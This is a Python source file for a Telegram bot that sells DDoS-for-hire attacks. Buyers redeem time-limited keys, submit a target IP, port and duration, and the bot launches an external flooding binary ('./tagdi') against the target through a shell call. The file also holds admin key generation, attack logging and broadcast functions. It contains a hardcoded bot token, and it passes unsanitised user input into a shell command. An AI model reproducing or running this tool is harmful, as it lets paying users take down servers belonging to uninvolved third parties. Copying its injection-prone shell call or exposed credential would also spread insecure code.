import time
import json
import random
import string
import pytz
import telebot
import datetime
import subprocess
import threading
from telebot import types

# Insert your Telegram bot token here
bot = telebot.TeleBot('7581242120:AAECD0DyAS-M4HV5YXYrLyFfXKYd1XvNId8')

# Admin user IDs
admin_id = {"6957116305"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# set attack cooldown per user
COOLDOWN_PERIOD = 0 # set cooldown after one attack 
ATTACK_TIME = 0 # set max attack time for users
MAX_ATTACKS = 1 # set max attacks at same time

# Attack setting for users
ALLOWED_PORT_RANGE = range(10003, 30000)
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}

# In-memory storage
users = {}
keys = {}
bot_data = {}
active_attacks = []
last_attack_time = {}
pending_broadcasts = {} 

# --- Data Loading and Saving Functions ---

def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)
        
# Function to load used keys from 'usedkey.txt'
def load_used_keys():
    try:
        with open("usedkey.txt", "r") as file:
            return set(file.read().splitlines())  # Read all keys and return as a set
    except FileNotFoundError:
        return set()

# Function to save used keys to 'usedkey.txt'
def save_used_keys(used_keys):
    with open("usedkey.txt", "w") as file:
        file.write("\n".join(used_keys))  # Save the used keys
used_keys = load_used_keys()

# --- Logging Functions ---
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
    
def generate_key(duration, length=7):
    characters = string.ascii_letters + string.digits
    key = ''.join(random.choice(characters) for _ in range(length))
    return f"ANSAR-{duration.upper()}-{key.upper()}"

def add_time_to_current_date(hours=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')

def convert_utc_to_ist(utc_time_str):
    utc_time = datetime.datetime.strptime(utc_time_str, '%Y-%m-%d %H:%M:%S')
    utc_time = utc_time.replace(tzinfo=pytz.utc)
    ist_time = utc_time.astimezone(pytz.timezone('Asia/Kolkata'))
    return ist_time.strftime('%Y-%m-%d %H:%M:%S')

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱❗️"
            bot.reply_to(message, response)
            del users[user_id]
            save_users()
            return
            
    else:
        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! DM ~ Sanjai10_oct_2k03 ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
        return

    # Check if cooldown period has passed
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
            bot.reply_to(message, response)
            return  # Prevent the attack from proceeding
            
    if len(active_attacks) >= MAX_ATTACKS:
        next_free_slot = min(active_attacks, key=lambda x: x[0])[0]
        remaining_time = int((next_free_slot - datetime.datetime.now()).total_seconds())

        if remaining_time > 0:
            bot.reply_to(message, f"☢️ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗶𝘀 𝗯𝘂𝘀𝘆 𝗽𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 {remaining_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
        return

    # Prompt the user for attack details
    response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
    bot.register_next_step_handler(message, process_attack_details)
    bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) == 3:
        target = details[0]
        
        try:
            port = int(details[1])
            time = int(details[2])
            
            if user_id not in admin_id:
               if time > ATTACK_TIME:
                   bot.reply_to(message, f"❗️𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗺𝘂𝘀𝘁 𝗯𝗲 𝘂𝗻𝗱𝗲𝗿 {ATTACK_TIME} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                   return
            
            if port not in ALLOWED_PORT_RANGE:
                bot.reply_to(message, f"⛔️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗮𝗿𝗲 𝗼𝗻𝗹𝘆 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗼𝗻 𝗽𝗼𝗿𝘁𝘀 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 [10003 - 29999]")
                return

            if port in BLOCKED_PORTS:
                bot.reply_to(message, f"⛔️ 𝗣𝗼𝗿𝘁 {port} 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝗮𝗻𝗱 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝘂𝘀𝗲𝗱!")
                return
    
            else:
                # Record and log the attack
                log_command(user_id, target, port, time)
                full_command = f"./tagdi {target} {port} {time} 1200"
                username = message.chat.username or "No username"
                end_time = datetime.datetime.now() + datetime.timedelta(seconds=time)
                active_attacks.append((end_time, message.chat.id))
                response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"

                # Run attack asynchronously (this won't block the bot)
                subprocess.Popen(full_command, shell=True)
                
                # After attack time finishes, notify user
                threading.Timer(time, end_attack, [message.chat.id]).start()

                # Update the last attack time for the user
                last_attack_time[user_id] = datetime.datetime.now()

        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
        
    bot.reply_to(message, response)

def end_attack(user_id):
    global active_attacks

    # Remove the attack from the active list
    active_attacks = [attack for attack in active_attacks if attack[1] != user_id]
    message = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅"
    bot.send_message(user_id, message)  

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    markup.add(attack_button, myinfo_button, redeem_button)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 ┊★ȺŁØNɆ☂࿐ꔪ┊™ 𝗯𝗼𝘁!", reply_markup=markup)


# Store the bot's start time
bot_start_time = datetime.datetime.now()

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "Admin" if user_id in admin_id else "User"

    # Check user access status
    if user_id in users:
        expiration_time = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        current_time = datetime.datetime.now()

        if expiration_time > current_time:
            status = f"{convert_utc_to_ist(users[user_id])}"
        else:
            status = "Expired 🅾️"
            del users[user_id]  # Remove the user from data storage if expired
            save_users()  # Save updated user data after removal
    else:
        status = "Not approved"

    # Calculate bot uptime (only for Admin)
    if user_id in admin_id:
        uptime = datetime.datetime.now() - bot_start_time
        days = uptime.days
        hours = uptime.seconds // 3600
        uptime_message = f"⏱️ 𝗕𝗼𝘁 𝗨𝗽𝘁𝗶𝗺𝗲: {days} day{'s' if days != 1 else ''}, {hours} hour{'s' if hours != 1 else ''}"
    else:
        uptime_message = ""

    # Format the response
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"🔖 𝗦𝘁𝗮𝘁𝘂𝘀: {role}\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"🕰️ 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {status}\n"
        f"{uptime_message}"
    )

    bot.reply_to(message, response)
    
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_command(message):
    user_id = str(message.chat.id)

    if user_id in users:
        bot.reply_to(message, "❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
        return

    msg = bot.reply_to(message, "📩 𝗦𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗿𝗲𝗱𝗲𝗺𝗽𝘁𝗶𝗼𝗻 𝗸𝗲𝘆:")
    bot.register_next_step_handler(msg, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip().upper()  # Convert key to uppercase for consistency

    if key in used_keys:  # Check if the key has already been used
        bot.reply_to(message, "📛 𝗞𝗲𝘆 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱 📛")
        return

    if key in keys:
        duration_in_hours = keys[key]  # Get the duration in hours
        current_time = datetime.datetime.now()

        # Set expiration time
        new_expiration_time = current_time + datetime.timedelta(hours=duration_in_hours)
        users[user_id] = new_expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()

        # Delete key after redemption
        del keys[key]
        save_keys()

        # Add the redeemed key to the used keys list
        used_keys.add(key)
        save_used_keys(used_keys)

        bot.reply_to(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝘂𝗻𝘁𝗶𝗹: {convert_utc_to_ist(users[user_id])}")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻𝘀 𝗼𝗻𝗹𝘆!", parse_mode='Markdown')
        return

    command = message.text.split()
    if len(command) < 3 or len(command) > 4:
        bot.reply_to(message, "ℹ️ 𝗨𝘀𝗮𝗴𝗲: `/genkey <amount> <days/hours> [quantity]`", parse_mode='Markdown')
        return

    try:
        time_amount = int(command[1])
        time_unit = command[2].lower()

        if time_unit not in ['hours', 'days']:
            raise ValueError("Invalid time unit")

        # Check if quantity is provided and is valid
        quantity = int(command[3]) if len(command) == 4 else 1
        if quantity <= 0:
            raise ValueError("𝗤𝘂𝗮𝗻𝘁𝗶𝘁𝘆 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮 𝗽𝗼𝘀𝗶𝘁𝗶𝘃𝗲 𝗶𝗻𝘁𝗲𝗴𝗲𝗿")
            
        if quantity > 50:
            bot.reply_to(message, "⚠️ 𝗟𝗶𝗺𝗶𝘁 𝗘𝘅𝗰𝗲𝗲𝗱𝗲𝗱!\nYou can generate up to 50 keys at a time.", parse_mode='Markdown')
            return

        # Convert duration to hours
        duration_in_hours = time_amount * 24 if time_unit == 'days' else time_amount
        formatted_duration = f"{time_amount} {time_unit}" if time_amount > 1 else f"{time_amount} {time_unit[:-1]}"

        keys_generated = []
        for _ in range(quantity):
            key = generate_key(formatted_duration.replace(" ", "").upper())
            keys[key] = duration_in_hours
            keys_generated.append(key)

        save_keys()

        response = "✅ 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n"
        for key in keys_generated:
            response += (f"𝗞𝗲𝘆: `{key}`\n"
                         f"𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: `{time_amount} {time_unit}`\n"
                         f"𝗦𝘁𝗮𝘁𝘂𝘀: `Unused`\n\n")
                        
    except ValueError:
        response = "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!"

    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['users'])
def list_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Generate the list of authorized users
        if users:
            response = "𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n\n"
            for uid, expiry in users.items():
                # Check if subscription is active
                status = "Active ✅" if datetime.datetime.now() < datetime.datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S') else "Expired 🅾️"
                response += f"𝗨𝘀𝗲𝗿𝗜𝗗: `{uid}`\n𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: `{convert_utc_to_ist(expiry)}`\n𝗦𝘁𝗮𝘁𝘂𝘀: `{status}`\n\n"
        else:
            response = "𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"

    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(func=lambda message: message.text == "Add")
def add_user_command(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
        
    bot.send_message(message.chat.id, "*Enter the User ID:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, ask_duration_unit)

def ask_duration_unit(message):
    user_id = message.text.strip()
    
    # Store user ID temporarily
    bot_data[message.chat.id] = {"user_id": user_id}

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("Days", callback_data="days"))
    markup.add(types.InlineKeyboardButton("Hours", callback_data="hours"))

    bot.send_message(message.chat.id, "⏳ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["days", "hours"])
def ask_duration(call):
    bot.answer_callback_query(call.id)

    chat_id = call.message.chat.id
    time_unit = "days" if call.data == "days" else "hours"

    # Store the selected time unit
    bot_data[chat_id]["time_unit"] = time_unit

    # Edit the message to ask for the number of days/hours
    bot.edit_message_text(
        chat_id=chat_id, 
        message_id=call.message.message_id, 
        text=f"*Enter the number of {time_unit}:*", parse_mode='Markdown')

    bot.register_next_step_handler(call.message, add_user_access)

def add_user_access(message):
    chat_id = message.chat.id
    user_data = bot_data.get(chat_id, {})

    if "user_id" not in user_data or "time_unit" not in user_data:
        bot.send_message(chat_id, "⚠️ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝘀𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀..")
        return

    user_id = user_data["user_id"]
    time_unit = user_data["time_unit"]

    try:
        duration_value = int(message.text.strip())

        if time_unit == "days":
            duration_in_hours = duration_value * 24
        else:
            duration_in_hours = duration_value

        expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()

        bot.send_message(chat_id, f"✅ 𝗨𝘀𝗲𝗿 *{user_id}* 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 *{duration_value}* *{time_unit}*!", parse_mode='Markdown')
    
    except ValueError:
        bot.send_message(chat_id, "❗ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!")
        
@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]  # Remove the user from the `users` dictionary
                save_users()  # Save updated user data to the file
                response = f"𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 👍"
            else:
                response = f"𝗨𝘀𝗲𝗿 {target_user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁"
        else:
            response = "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝘂𝘀𝗲𝗿_𝗶𝗱>"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"

    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def log_command_request(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file, caption="𝗔𝘁𝘁𝗮𝗰𝗸 𝗹𝗼𝗴𝘀 ✅")
        except FileNotFoundError:
            bot.reply_to(message, "𝗡𝗼 𝗹𝗼𝗴𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.")
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:  # Admin check
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        return

    msg_parts = message.text.split(" ", 2)

    if len(msg_parts) == 3:  # Targeted message
        target_user_id = msg_parts[1]
        broadcast_message = msg_parts[2]

        if not target_user_id.isdigit():  # Validate user ID
            response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘂𝘀𝗲𝗿 𝗜𝗗."
            bot.reply_to(message, response)
            return

        try:
            bot.send_message(int(target_user_id), broadcast_message)
            response = f"📤 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝘂𝘀𝗲𝗿 {target_user_id}."
        except Exception as e:
            response = f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝗻𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲. {str(e)}"

        bot.reply_to(message, response)
    
    elif len(msg_parts) == 1:  # No message provided, ask admin for input
        pending_broadcasts[user_id] = True
        bot.reply_to(message, "📢 𝗦𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘁𝗼 𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀.")

@bot.message_handler(func=lambda message: str(message.chat.id) in pending_broadcasts)
def handle_broadcast_response(message):
    user_id = str(message.chat.id)

    if user_id in pending_broadcasts:
        broadcast_message = message.text
        del pending_broadcasts[user_id]  # Remove pending state

        for user in users:
            try:
                bot.send_message(int(user), broadcast_message)
            except Exception as e:
                print(f"Failed to send message to {user}: {e}")

        response = "📤 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀."

    bot.reply_to(message, response)
            
if __name__ == "__main__":
    print("✅ Bot is active!... ")
    while True:
        load_data()
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
        time.sleep(3)